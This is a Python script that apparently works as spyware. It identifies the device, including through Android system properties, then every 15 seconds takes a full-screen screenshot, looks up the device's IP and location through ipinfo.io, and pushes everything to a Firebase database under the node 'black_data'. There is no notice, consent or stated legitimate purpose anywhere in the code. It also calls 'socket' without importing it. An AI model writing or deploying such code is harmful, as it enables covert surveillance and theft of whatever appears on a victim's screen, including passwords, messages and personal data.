import requests
import time
import platform
import subprocess
from bs4 import BeautifulSoup
import mss
import base64
from io import BytesIO
from PIL import Image
import firebase_admin
from firebase_admin import credentials, db

# Initialize Firebase
cred = credentials.Certificate("path/to/your/firebase_credentials.json")
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://your-database-name.firebaseio.com/'
})

def capture_screen():
    try:
        with mss.mss() as sct:
            screenshot = sct.shot(output='screenshot.png')
            img = Image.open(screenshot)
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            return base64.b64encode(buffered.getvalue()).decode('utf-8')
    except Exception as e:
        print(f"Error occurred while capturing screen: {e}")
        return None

def get_ip_info():
    try:
        response = requests.get("http://ipinfo.io/json")
        data = response.json()
        return data
    except Exception as e:
        print(f"Error occurred: {e}")
        return None

def get_device_name():
    try:
        device_name = platform.node()
        if device_name == "localhost" or not device_name:
            device_name = socket.gethostname()

        if "localhost" in device_name or not device_name:
            try:
                model = subprocess.run(['getprop', 'ro.product.model'], capture_output=True, text=True).stdout.strip()
                manufacturer = subprocess.run(['getprop', 'ro.product.manufacturer'], capture_output=True, text=True).stdout.strip()
                search_query = f"{manufacturer} {model}"
                device_name = fetch_device_name_from_google(search_query)
            except Exception as e:
                print(f"Error occurred while fetching device name using subprocess: {e}")
                device_name = "Unknown Device"
        return device_name
    except Exception as e:
        print(f"Error occurred while fetching device name: {e}")
        return "Unknown Device"

def fetch_device_name_from_google(query):
    try:
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
        search_url = f"https://www.google.com/search?q={query.replace(' ', '+')}"
        response = requests.get(search_url, headers=headers)

        soup = BeautifulSoup(response.text, 'html.parser')
        first_result = soup.find('h3')

        if first_result:
            device_name = first_result.text.split(' - ')[0]
            return device_name
        else:
            return query
    except Exception as e:
        print(f"Error occurred while searching on Google: {e}")
        return query

def send_data_to_firebase(data):
    ref = db.reference('black_data')
    ref.push(data)

def main():
    device_name = get_device_name()

    while True:
        ip_info = get_ip_info()
        screenshot = capture_screen()

        data = {
            "device_name": device_name,
            "ip_info": ip_info,
            "screenshot": screenshot,
            "timestamp": time.time()
        }

        send_data_to_firebase(data)
        time.sleep(15)

if __name__ == "__main__":
    main()
